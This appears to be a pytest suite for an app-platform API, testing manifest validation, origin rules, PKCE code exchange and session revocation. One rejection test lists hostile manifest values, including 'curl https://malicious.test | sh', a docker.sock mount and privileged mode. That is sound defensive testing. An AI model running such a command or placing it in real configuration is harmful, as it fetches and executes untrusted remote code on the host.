from __future__ import annotations

import base64
import hashlib
import json
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timedelta
from pathlib import Path

import pytest
from pydantic import ValidationError
from sqlalchemy import delete, select

from miy_api.core.db import get_session_factory
from miy_api.core.settings import get_settings
from miy_api.domains.auth.models import (
    AuthSession,
    CompanyAppControl,
    User,
    UserSystemRole,
    utcnow_naive,
)
from miy_api.domains.auth.security import hash_token
from miy_api.domains.independent_apps.contracts import AppDefinition, InstallationInput
from miy_api.domains.independent_apps.models import (
    AppDefinitionRecord,
    AppInstallationRecord,
    AppLaunchCode,
    AppSession,
)
from test_organization_integrations import _auth_headers, _bootstrap_admin


@pytest.fixture(autouse=True)
def platform_origins(monkeypatch):
    monkeypatch.setenv(
        "MIY_INDEPENDENT_APP_PLATFORM_ORIGINS", '["https://platform.test", "http://127.0.0.1:4200"]'
    )
    get_settings.cache_clear()
    yield
    get_settings.cache_clear()


def test_separate_web_origin_is_enforced_by_server_and_missing_configuration_fails_closed(
    client, monkeypatch
):
    _, headers, _, installation, data = setup_app(client)
    assert (
        client.post(
            "/api/v1/independent-apps/sample-independent/installations",
            headers=headers,
            json=data | {"origin": "http://127.0.0.1:4200"},
        ).status_code
        == 422
    )
    monkeypatch.setenv("MIY_INDEPENDENT_APP_PLATFORM_ORIGINS", "[]")
    get_settings.cache_clear()
    assert (
        client.post(
            "/api/v1/independent-apps/launch",
            headers=headers,
            json={"installation_id": installation["id"], "code_challenge": "a" * 43},
        ).status_code
        == 503
    )
    catalog = client.get("/api/v1/independent-apps/catalog", headers=headers).json()
    assert catalog["items"][0]["installations"][0]["launchable"] is False


def manifest(app_id: str = "sample-independent") -> dict:
    return {
        "schema_version": 1,
        "app_id": app_id,
        "display": {"name": "Test application", "translations": {"ko-KR": "시험 앱"}},
        "source": {"repository": "https://example.test/team/sample.git"},
        "requested_permissions": ["identity:read"],
    }


def setup_app(client):
    admin = _bootstrap_admin(client)
    headers = _auth_headers(admin["token"])
    definition = client.put(
        "/api/v1/independent-apps/definitions",
        headers=headers,
        json={
            "definition": manifest(),
            "source_revision": "a" * 40,
        },
    )
    assert definition.status_code == 200, definition.text
    installation_data = {
        "environment": "development",
        "origin": "https://sample.test",
        "enabled": True,
        "user_ids": [admin["user"]["id"]],
        "granted_permissions": ["identity:read"],
    }
    installation = client.post(
        "/api/v1/independent-apps/sample-independent/installations",
        headers=headers,
        json=installation_data,
    )
    assert installation.status_code == 201, installation.text
    return admin, headers, definition.json(), installation.json(), installation_data


def launch(client, headers, installation):
    verifier = "v" * 43
    challenge = (
        base64.urlsafe_b64encode(hashlib.sha256(verifier.encode()).digest()).decode().rstrip("=")
    )
    response = client.post(
        "/api/v1/independent-apps/launch",
        headers=headers,
        json={
            "installation_id": installation["id"],
            "code_challenge": challenge,
        },
    )
    assert response.status_code == 200, response.text
    assert response.headers["cache-control"] == "private, no-store"
    assert datetime.fromisoformat(response.json()["expires_at"]).utcoffset() == timedelta(0)
    return {
        "installation_id": installation["id"],
        "code": response.json()["code"],
        "code_verifier": verifier,
    }


def exchange(client, payload):
    return client.post(
        "/api/v1/independent-apps/exchange", headers={"Origin": "https://sample.test"}, json=payload
    )


def identity(client, token, installation_id, audience="https://sample.test"):
    return client.get(
        "/api/v1/independent-apps/session",
        headers=_auth_headers(token),
        params={
            "installation_id": installation_id,
            "audience": audience,
        },
    )


@pytest.mark.parametrize(
    "extra",
    [
        {"initializeCommand": "curl https://malicious.test | sh"},
        {"mounts": ["/var/run/docker.sock"]},
        {"privileged": True},
        {"env": {"TOKEN": "secret"}},
        {"schema_version": 2},
        {"sdk_version": 2},
        {"runtime_profile": "host"},
        {"requested_permissions": ["platform:admin"]},
    ],
)
def test_manifest_is_versioned_and_cannot_request_host_privilege(extra):
    with pytest.raises(ValidationError):
        AppDefinition.model_validate(manifest() | extra)


@pytest.mark.parametrize(
    "origin",
    [
        "http://remote.test",
        "https://app.test/",
        "https://user:password@app.test",
        "https://app.test/path",
        "https://app.test?token=secret",
        "https://app.test#fragment",
        "https://APP.test",
        "https://app.test:443",
        "https://app.test\\other",
        "https://app.test:invalid",
    ],
)
def test_installation_rejects_ambiguous_and_insecure_origins(origin):
    with pytest.raises(ValidationError):
        InstallationInput(environment="development", origin=origin)


def test_manifest_digest_is_canonical_and_schema_matches_generated_contract():
    parsed = AppDefinition.model_validate(manifest())
    assert (
        parsed.content_digest()
        == AppDefinition.model_validate(parsed.model_dump()).content_digest()
    )
    schema_path = (
        Path(__file__).resolve().parents[3] / "packages/contracts/independent-app.schema.json"
    )
    schema = json.loads(schema_path.read_text())
    expected = AppDefinition.model_json_schema()
    expected["$schema"] = "https://json-schema.org/draft/2020-12/schema"

    def without_defaults(value):
        if isinstance(value, dict):
            return {key: without_defaults(item) for key, item in value.items() if key != "default"}
        if isinstance(value, list):
            return [without_defaults(item) for item in value]
        return value

    assert without_defaults(schema) == without_defaults(expected)
    # Wire clients also need Pydantic's factory defaults to compare canonical
    # definitions. They are published in addition to the unchanged constraints.
    minimal = AppDefinition.model_validate({
        "app_id": "minimal-app",
        "display": {"name": "Minimal"},
        "source": {"repository": "https://example.test/team/minimal.git"},
    }).model_dump(mode="json")
    assert schema["properties"]["entrypoints"]["default"] == minimal["entrypoints"]
    assert schema["properties"]["requested_permissions"]["default"] == minimal["requested_permissions"]
    assert schema["$defs"]["Display"]["properties"]["translations"]["default"] == minimal["display"]["translations"]


def test_registry_is_durable_preserves_installations_and_cannot_forge_verified_releases(client):
    admin, headers, definition, installation, _ = setup_app(client)
    forbidden = manifest("docs")
    assert (
        client.put(
            "/api/v1/independent-apps/definitions",
            headers=headers,
            json={
                "definition": forbidden,
                "source_revision": "a" * 40,
            },
        ).status_code
        == 409
    )
    invalid = manifest() | {"schema_version": 99}
    assert (
        client.put(
            "/api/v1/independent-apps/definitions",
            headers=headers,
            json={
                "definition": invalid,
                "source_revision": "b" * 40,
                "expected_digest": definition["definition_digest"],
            },
        ).status_code
        == 422
    )
    assert client.get("/api/v1/independent-apps/catalog").status_code == 401
    result = client.get("/api/v1/independent-apps/catalog?page_size=1", headers=headers).json()
    assert (
        result["total"] == 1 and result["items"][0]["installations"][0]["id"] == installation["id"]
    )
    release_payload = {
        "definition_digest": definition["definition_digest"],
        "source_revision": "a" * 40,
        "artifact": "registry.test/apps/sample@sha256:" + "b" * 64,
    }
    release = client.post(
        "/api/v1/independent-apps/sample-independent/releases",
        headers=headers,
        json=release_payload,
    )
    assert release.status_code == 201, release.text
    assert release.json()["verification_id"] is None and release.json()["verified_at"] is None
    assert (
        client.post(
            "/api/v1/independent-apps/sample-independent/releases",
            headers=headers,
            json=release_payload | {"verified_at": "2026-01-01T00:00:00"},
        ).status_code
        == 422
    )
    assert (
        client.post(
            "/api/v1/independent-apps/sample-independent/releases",
            headers=headers,
            json=release_payload,
        ).json()["id"]
        == release.json()["id"]
    )
    assert (
        client.post(
            "/api/v1/independent-apps/sample-independent/installations",
            headers=headers,
            json={
                "environment": "production",
                "origin": "https://production.test",
                "enabled": True,
            },
        ).status_code
        == 409
    )
    with get_session_factory()() as db:
        assert db.get(AppDefinitionRecord, "sample-independent").source_revision == "a" * 40
        assert db.get(AppInstallationRecord, installation["id"]).enabled is True
        logs = db.execute(select(AppLaunchCode)).all()
        assert not logs


def test_exchange_is_bound_to_pkce_origin_installation_and_one_use(client):
    admin, headers, _, installation, _ = setup_app(client)
    payload = launch(client, headers, installation)
    assert exchange(client, payload | {"code_verifier": "x" * 43}).status_code == 401
    assert (
        client.post(
            "/api/v1/independent-apps/exchange",
            headers={"Origin": "https://wrong.test"},
            json=payload,
        ).status_code
        == 401
    )
    assert exchange(client, payload | {"installation_id": "wrong-installation"}).status_code == 401
    with ThreadPoolExecutor(max_workers=2) as pool:
        responses = list(pool.map(lambda _: exchange(client, payload), range(2)))
    assert sorted(response.status_code for response in responses) == [200, 401]
    session = next(response.json() for response in responses if response.status_code == 200)
    assert session["audience"] == "https://sample.test"
    assert datetime.fromisoformat(session["expires_at"]).utcoffset() == timedelta(0)
    assert (
        identity(client, session["token"], installation["id"]).json()["user_id"]
        == admin["user"]["id"]
    )
    assert (
        identity(client, session["token"], installation["id"], "https://other.test").status_code
        == 401
    )
    assert identity(client, admin["token"], installation["id"]).status_code == 401
    assert client.get("/api/v1/auth/me", headers=_auth_headers(session["token"])).status_code == 401
    with get_session_factory()() as db:
        stored = db.get(AppSession, hash_token(session["token"]))
        assert stored is not None and stored.token_hash != session["token"]


@pytest.mark.parametrize(
    "change",
    [
        "source_revoked",
        "source_expired",
        "user_blocked",
        "grant_removed",
        "generation_changed",
        "session_expired",
        "session_revoked",
        "impersonated",
        "company_disabled",
    ],
)
def test_existing_app_session_rechecks_live_authority_on_every_request(client, change):
    admin, headers, _, installation, _ = setup_app(client)
    payload = launch(client, headers, installation)
    session = exchange(client, payload).json()
    assert identity(client, session["token"], installation["id"]).status_code == 200
    with get_session_factory()() as db:
        app_session = db.get(AppSession, hash_token(session["token"]))
        source = db.get(AuthSession, app_session.source_session_id)
        installed = db.get(AppInstallationRecord, installation["id"])
        if change == "source_revoked":
            source.revoked_at = utcnow_naive()
        elif change == "source_expired":
            source.expires_at = utcnow_naive() - timedelta(seconds=1)
        elif change == "user_blocked":
            db.get(User, admin["user"]["id"]).login_blocked = True
        elif change == "grant_removed":
            installed.user_ids = []
        elif change == "generation_changed":
            installed.generation += 1
        elif change == "session_expired":
            app_session.expires_at = utcnow_naive() - timedelta(seconds=1)
        elif change == "session_revoked":
            app_session.revoked_at = utcnow_naive()
        elif change == "impersonated":
            source.impersonator_user_id = admin["user"]["id"]
        elif change == "company_disabled":
            db.get(CompanyAppControl, installation["app_id"]).enabled = False
        db.commit()
    assert identity(client, session["token"], installation["id"]).status_code == 401


def test_installation_policy_update_invalidates_launches_and_sessions(client):
    _, headers, _, installation, data = setup_app(client)
    old_code = launch(client, headers, installation)
    token = exchange(client, launch(client, headers, installation)).json()["token"]
    updated = client.put(
        f"/api/v1/independent-apps/sample-independent/installations/{installation['id']}",
        headers=headers,
        json=data | {"enabled": False},
    )
    assert updated.status_code == 200, updated.text
    assert updated.json()["generation"] == installation["generation"] + 1
    assert exchange(client, old_code).status_code == 401
    assert identity(client, token, installation["id"]).status_code == 401


def test_source_revision_updates_detect_stale_cas_and_production_installations_are_unique(client):
    _, headers, definition, _, _ = setup_app(client)
    payload = {
        "definition": manifest(),
        "source_revision": "b" * 40,
        "expected_digest": definition["definition_digest"],
        "expected_source_revision": "a" * 40,
    }
    assert (
        client.put(
            "/api/v1/independent-apps/definitions", headers=headers, json=payload
        ).status_code
        == 200
    )
    assert (
        client.put(
            "/api/v1/independent-apps/definitions",
            headers=headers,
            json=payload | {"source_revision": "c" * 40},
        ).status_code
        == 409
    )
    production = {
        "environment": "production",
        "origin": "https://first-production.test",
        "enabled": False,
    }
    assert (
        client.post(
            "/api/v1/independent-apps/sample-independent/installations",
            headers=headers,
            json=production,
        ).status_code
        == 201
    )
    assert (
        client.post(
            "/api/v1/independent-apps/sample-independent/installations",
            headers=headers,
            json=production | {"origin": "https://second-production.test"},
        ).status_code
        == 409
    )


def test_former_admin_cannot_reclassify_official_app_as_personal(client):
    admin = _bootstrap_admin(client)
    headers = _auth_headers(admin["token"])
    definition = client.put(
        "/api/v1/independent-apps/definitions",
        headers=headers,
        json={
            "definition": manifest() | {"ownership": "official"},
            "source_revision": "a" * 40,
        },
    ).json()
    with get_session_factory()() as db:
        db.execute(delete(UserSystemRole).where(UserSystemRole.user_id == admin["user"]["id"]))
        db.commit()
    assert (
        client.put(
            "/api/v1/independent-apps/definitions",
            headers=headers,
            json={
                "definition": manifest() | {"ownership": "personal"},
                "source_revision": "b" * 40,
                "expected_digest": definition["definition_digest"],
                "expected_source_revision": "a" * 40,
            },
        ).status_code
        == 403
    )
